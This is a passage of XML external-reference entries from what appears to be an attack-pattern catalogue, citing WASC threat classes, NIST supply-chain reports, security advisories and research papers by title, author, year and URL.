         <ns0:URL>http://projects.webappsec.org/Cross-Site-Scripting</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-284">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Cross-Site-Request-Forgery</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-285">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Denial-of-Service</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-286">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Brute-Force</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-287">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Content-Spoofing</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-288">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Information-Leakage</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-289">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Server-Misconfiguration</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-290">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Application-Misconfiguration</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-293">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Improper-Filesystem-Permissions</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-294">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Credential-and-Session-Prediction</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-295">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/SQL-Injection</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-297">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Insufficient+Anti-automation</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-298">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Improper-Output-Handling</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-299">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/XML-Injection</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-300">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/HTTP-Request-Splitting</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-301">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/HTTP-Response-Splitting</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-302">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/HTTP-Request-Smuggling</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-303">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/HTTP-Response-Smuggling</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-304">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Null-Byte-Injection</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-306">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Mail-Command-Injection</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-307">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/OS-Commanding</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-308">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Routing-Detour</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-309">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Path-Traversal</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-310">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Predictable-Resource-Location</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-311">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/SOAP-Array-Abuse</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-312">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/SSI-Injection</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-313">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Session-Fixation</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-314">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/URL-Redirector-Abuse</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-315">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/XPath-Injection</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-316">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Insufficient-Process-Validation</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-317">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/XML-Attribute-Blowup</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-318">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Abuse-of-Functionality</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-319">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/XML-External-Entities</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-320">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/XML-Entity-Expansion</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-322">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/XQuery-Injection</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-324">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Insufficient-Session-Expiration</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-325">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Insecure-Indexing</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-326">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Insufficient-Password-Recovery</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-327">
         <ns0:Author>Tom Stracener</ns0:Author>
         <ns0:Author>Sean Barnum</ns0:Author>
         <ns0:Title>So Many Ways [...]: Exploiting Facebook and YoVille</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>Defcon 18</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-348">
         <ns0:Title>The Official Social Engineering Portal</ns0:Title>
         <ns0:Publication>Social-Engineer.org</ns0:Publication>
         <ns0:Publisher>Tick Tock Computers, LLC</ns0:Publisher>
         <ns0:URL>http://www.social-engineer.org</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-360">
         <ns0:Title>Social Engineering: The Art of Human Hacking</ns0:Title>
         <ns0:Publication>2010</ns0:Publication>
         <ns0:Publisher>Wiley</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-364">
         <ns0:Title>CERT Advisory CA-1997-05 MIME Conversion Buffer Overflow in Sendmail Versions 8.8.3 and 8.8.4</ns0:Title>
         <ns0:Publisher>Software Engineering Institute: Carnegie Mellon University</ns0:Publisher>
         <ns0:URL>http://www.cert.org/advisories/CA-1997-05.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-379">
         <ns0:Author>Jon Boyens</ns0:Author>
         <ns0:Author>Angela Smith</ns0:Author>
         <ns0:Author>Nadya Bartol</ns0:Author>
         <ns0:Author>Kris Winkler</ns0:Author>
         <ns0:Author>Alex Holbrook</ns0:Author>
         <ns0:Author>Matthew Fallon</ns0:Author>
         <ns0:Title>Cybersecurity Supply Chain Risk Management Practices for Systems and Organizations (2nd Draft)</ns0:Title>
         <ns0:Publication_Year>2021</ns0:Publication_Year>
         <ns0:Publication_Month>--10</ns0:Publication_Month>
         <ns0:Publication_Day>---28</ns0:Publication_Day>
         <ns0:Publisher>National Institute of Standards and Technology (NIST)</ns0:Publisher>
         <ns0:URL>https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-161r1-draft2.pdf</ns0:URL>
         <ns0:URL_Date>2022-02-16</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-380">
         <ns0:Author>Marcus Sachs</ns0:Author>
         <ns0:Title>Supply Chain Attacks: Can We Secure Information Technology Supply Chain in the Age of Globalization</ns0:Title>
         <ns0:Publisher>Verizon, Inc.</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-381">
         <ns0:Author>Thea Reilkoff</ns0:Author>
         <ns0:Title>Hardware Trojans: A Novel Attack Meets a New Defense</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>Yale School of Engineering and Applied Science</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-382">
         <ns0:Author>Marianne Swanson</ns0:Author>
         <ns0:Author>Nadya Bartol</ns0:Author>
         <ns0:Author>Rama Moorthy</ns0:Author>
         <ns0:Title>Piloting Supply Chain Risk Management Practices for Federal Information Systems</ns0:Title>
         <ns0:Edition>Draft NISTIR 7622</ns0:Edition>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>National Institute of Standards and Technology</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-384">
         <ns0:Author>SAFECode</ns0:Author>
         <ns0:Title>The Software Supply Chain Integrity Framework Defining Risks and Responsibilities for Securing Software in the Global Supply Chain</ns0:Title>
         <ns0:Publication_Year>2009</ns0:Publication_Year>
         <ns0:Publisher>Safecode.org</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-387">
         <ns0:Author>Marshall Brain</ns0:Author>
         <ns0:Title>How Computer Viruses Work</ns0:Title>
         <ns0:Publication_Year>2007</ns0:Publication_Year>
         <ns0:Publisher>MindPride</ns0:Publisher>
         <ns0:URL>http://www.mindpride.net/root/Extras/how-stuff-works/how_computer_viruses_work.htm</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-394">
         <ns0:Author>Robert Lemos</ns0:Author>
         <ns0:Title>Researchers: Rootkits headed for BIOS</ns0:Title>
         <ns0:Publication_Year>2006</ns0:Publication_Year>
         <ns0:Publisher>SecurityFocus</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-395">
         <ns0:Author>Alexander Sotirov</ns0:Author>
         <ns0:Author>Marc Stevens</ns0:Author>
         <ns0:Author>Jacob Appelbaum</ns0:Author>
         <ns0:Author>Arjen Lenstra</ns0:Author>
         <ns0:Author>David Molnar</ns0:Author>
         <ns0:Author>Dag Arne Osvik</ns0:Author>
         <ns0:Author>Benne de Weger</ns0:Author>
         <ns0:Title>MD5 Considered Harmful Today: Creating a Rogue CA Certificate</ns0:Title>
         <ns0:Publication_Year>2008</ns0:Publication_Year>
         <ns0:Publication_Month>--12</ns0:Publication_Month>
         <ns0:Publication_Day>---30</ns0:Publication_Day>
         <ns0:Publisher>Phreedom.org</ns0:Publisher>
         <ns0:URL>http://www.phreedom.org/research/rogue-ca/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-397">
         <ns0:Author>Luca Carettoni</ns0:Author>
         <ns0:Author>Stefano di Paola</ns0:Author>
         <ns0:Title>HTTP Parameter Pollution</ns0:Title>
         <ns0:Edition>OWASP EU09 Poland</ns0:Edition>
         <ns0:Publication_Year>2008</ns0:Publication_Year>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-398">
         <ns0:Author>Thai Duong</ns0:Author>
         <ns0:Author>Juliano Rizzo</ns0:Author>
         <ns0:Title>Flickr's API Signature Forgery Vulnerability</ns0:Title>
         <ns0:Publication_Year>2009</ns0:Publication_Year>
         <ns0:Publication_Month>--09</ns0:Publication_Month>
         <ns0:Publication_Day>---28</ns0:Publication_Day>
         <ns0:URL>http://netifera.com/research/flickr_api_signature_forgery.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-399">
         <ns0:Author>Chris Evans</ns0:Author>
         <ns0:Title>Cross-Domain Search Timing</ns0:Title>
         <ns0:Publication_Year>2009</ns0:Publication_Year>
         <ns0:Publication_Month>--12</ns0:Publication_Month>
         <ns0:Publication_Day>---11</ns0:Publication_Day>
         <ns0:URL>http://scarybeastsecurity.blogspot.com/2009/12/cross-domain-search-timing.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-400">
         <ns0:Author>Juliano Rizzo</ns0:Author>
         <ns0:Author>Thai Duong</ns0:Author>
         <ns0:Title>Practical Padding Oracle Attacks</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publication_Month>--05</ns0:Publication_Month>
         <ns0:Publication_Day>---25</ns0:Publication_Day>
         <ns0:URL>https://www.usenix.org/legacy/events/woot10/tech/full_papers/Rizzo.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-401">
         <ns0:Author>Samy Kamkar</ns0:Author>
         <ns0:Title>Evercookie</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publication_Month>--09</ns0:Publication_Month>
         <ns0:Publication_Day>---09</ns0:Publication_Day>
         <ns0:URL>http://samy.pl/evercookie/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-402">
         <ns0:Author>Robert Auger</ns0:Author>
         <ns0:Title>Socket Capable Browser Plugins Result In Transparent Proxy Abuse</ns0:Title>
         <ns0:Publication_Year>2009</ns0:Publication_Year>
         <ns0:URL>http://www.thesecuritypractice.com/the_security_practice/TransparentProxyAbuse.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-403">
         <ns0:Author>Roi Saltzman</ns0:Author>
         <ns0:Author>Adi Sharabani</ns0:Author>
         <ns0:Title>Active Man in the Middle Attacks</ns0:Title>
         <ns0:Publication_Year>2009</ns0:Publication_Year>
         <ns0:Publication_Month>--02</ns0:Publication_Month>
         <ns0:Publication_Day>---02</ns0:Publication_Day>
         <ns0:Publisher>IBM Rational Application Security Group</ns0:Publisher>
         <ns0:URL>http://blog.watchfire.com/wfblog/2009/02/active-man-in-the-middle-attacks.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-404">
         <ns0:Author>Ronen</ns0:Author>
         <ns0:Title>Cross Site Identification - or - How your social network might expose you when you least expect it</ns0:Title>
         <ns0:Publication_Year>2009</ns0:Publication_Year>
         <ns0:Publication_Month>--12</ns0:Publication_Month>
         <ns0:Publication_Day>---27</ns0:Publication_Day>
         <ns0:URL>http://blog.quaji.com/2009/12/out-of-context-information-disclosure.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-405">
         <ns0:Author>Chris Evans</ns0:Author>
         <ns0:Title>Generic cross-browser cross-domain theft</ns0:Title>
         <ns0:Publication_Year>2009</ns0:Publication_Year>
         <ns0:Publication_Month>--12</ns0:Publication_Month>
         <ns0:Publication_Day>---28</ns0:Publication_Day>
         <ns0:URL>http://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-406">
         <ns0:Author>Robert Hansen</ns0:Author>
         <ns0:Title>Slowris HTTP DoS</ns0:Title>
         <ns0:Publication_Year>2009</ns0:Publication_Year>
         <ns0:Publication_Month>--06</ns0:Publication_Month>
         <ns0:Publication_Day>---17</ns0:Publication_Day>
         <ns0:URL>http://ha.ckers.org/blog/20090617/slowloris-http-dos/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-408">
         <ns0:Author>Bernardo Damele Assump &#231;&#227;o Guimar&#227;es</ns0:Author>
         <ns0:Title>Advanced SQL Injection to Operating System Full Control</ns0:Title>
         <ns0:Publication_Year>2009</ns0:Publication_Year>
         <ns0:Publication_Month>--04</ns0:Publication_Month>
         <ns0:Publication_Day>---10</ns0:Publication_Day>
         <ns0:URL>http://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-409">
         <ns0:Title>M Trends Report</ns0:Title>
         <ns0:Publication_Year>2011</ns0:Publication_Year>
         <ns0:Publisher>Mandiant</ns0:Publisher>
         <ns0:URL>https://www.mandiant.com</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-410">
         <ns0:Author>Gareth Heyes</ns0:Author>
         <ns0:Title>Detecting browsers javascript hacks</ns0:Title>
         <ns0:Publication>The Spanner</ns0:Publication>
         <ns0:Publication_Year>2009</ns0:Publication_Year>
         <ns0:Publication_Month>--01</ns0:Publication_Month>
         <ns0:Publication_Day>---29</ns0:Publication_Day>
         <ns0:URL>http://www.thespanner.co.uk/2009/01/29/detecting-browsers-javascript-hacks/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-411">
         <ns0:Author>Sigbj&#248;rn Vik</ns0:Author>
         <ns0:Title>Security breach stopped</ns0:Title>
         <ns0:Publication_Year>2013</ns0:Publication_Year>
         <ns0:Publication_Month>--06</ns0:Publication_Month>
         <ns0:Publication_Day>---26</ns0:Publication_Day>
         <ns0:Publisher>http://my.opera.com/securitygroup/blog/2013/06/26/opera-infrastructure-attack</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-412">
         <ns0:Author>Patrick Morley</ns0:Author>
         <ns0:Title>Bit9 and Our Customers&#8217; Security</ns0:Title>
         <ns0:Publication_Year>2013</ns0:Publication_Year>
         <ns0:Publication_Month>--02</ns0:Publication_Month>
         <ns0:Publication_Day>---08</ns0:Publication_Day>
         <ns0:Publisher>https://blog.bit9.com/2013/02/08/bit9-and-our-customers-security/</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-413">
         <ns0:Author>Brad Arkin</ns0:Author>
         <ns0:Title>Inappropriate Use of Adobe Code Signing Certificate</ns0:Title>
         <ns0:Publication_Year>2012</ns0:Publication_Year>
         <ns0:Publication_Month>--09</ns0:Publication_Month>
         <ns0:Publication_Day>---27</ns0:Publication_Day>
         <ns0:Publisher>http://blogs.adobe.com/asset/2012/09/inappropriate-use-of-adobe-code-signing-certificate.html</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-414">
         <ns0:Author>Eric Johanson</ns0:Author>
         <ns0:Title>The state of homograph attacks</ns0:Title>
         <ns0:Publication_Year>2005</ns0:Publication_Year>
         <ns0:Publication_Month>--02</ns0:Publication_Month>
         <ns0:Publication_Day>---11</ns0:Publication_Day>
         <ns0:Publisher>http://www.shmoo.com/idn/homograph.txt</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-416">
         <ns0:Title>Core Concepts: Attack Patterns</ns0:Title>
         <ns0:URL>https://websec.io/2012/11/26/Core-Concepts-Attack-Patterns.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-418">
         <ns0:Title>Microsoft Security Bulletin MS13-002</ns0:Title>
         <ns0:Edition>Version 1.1</ns0:Edition>
         <ns0:Publication>Microsoft Security Response Center Archive</ns0:Publication>
         <ns0:Publication_Year>2013</ns0:Publication_Year>
         <ns0:Publication_Month>--01</ns0:Publication_Month>
         <ns0:Publication_Day>---08</ns0:Publication_Day>
         <ns0:Publisher>Microsoft</ns0:Publisher>
         <ns0:URL>https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2013/ms13-002</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-419">
         <ns0:Author>P.J. Leadbitter</ns0:Author>
         <ns0:Author>D. Page</ns0:Author>
         <ns0:Author>N.P. Smart</ns0:Author>
         <ns0:Title>Attacking DSA Under a Repeated Bits Assumption</ns0:Title>
         <ns0:Publication_Year>2004</ns0:Publication_Year>
         <ns0:Publication_Month>--07</ns0:Publication_Month>
         <ns0:Publisher>http://www.iacr.org/archive/ches2004/31560428/31560428.pdf</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-420">
         <ns0:Author>Debian Security</ns0:Author>
         <ns0:Title>DSA-1571-1 openssl -- predictable random number generator</ns0:Title>
         <ns0:Publication_Year>2008</ns0:Publication_Year>
         <ns0:Publication_Month>--05</ns0:Publication_Month>
         <ns0:Publication_Day>---13</ns0:Publication_Day>
         <ns0:Publisher>http://www.debian.org/security/2008/dsa-1571</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-421">
         <ns0:Author>Bryan Sullivan</ns0:Author>
         <ns0:Title>Regular Expression Denial of Service Attacks and Defenses</ns0:Title>
         <ns0:URL>http://msdn.microsoft.com/en-au/magazine/ff646973.aspx</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-422">
         <ns0:Title>SOAP Array Attack</ns0:Title>
         <ns0:URL>http://www.ws-attacks.org/index.php/Soap_Array_Attack</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-423">
         <ns0:Title>Security Considerations - IP Fragment Filtering</ns0:Title>
         <ns0:URL>https://www.rfc-editor.org/rfc/rfc1858.txt</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-424">
         <ns0:Author>Yossi Gilad</ns0:Author>
         <ns0:Author>Amir Herzberg</ns0:Author>
         <ns0:Title>Fragmentation Considered Vulnerable</ns0:Title>
         <ns0:Publication_Year>2012</ns0:Publication_Year>
         <ns0:URL>http://u.cs.biu.ac.il/~herzbea/security/12-03%20fragmentation.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-425">
         <ns0:Title>ICMP Attacks Illustrated</ns0:Title>
         <ns0:URL>http://www.sans.org/reading-room/whitepapers/threats/icmp-attacks-illustrated-477?show=icmp-attacks-illustrated-477&amp;cat=threats</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-426">
         <ns0:Author>Jonathan Zdziarksi</ns0:Author>
         <ns0:Title>Hacking and Securing iOS Applications</ns0:Title>
         <ns0:Edition>First Edition</ns0:Edition>
         <ns0:Publication_Year>2012</ns0:Publication_Year>
         <ns0:Publisher>O'Reilly Media, Inc.</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-427">
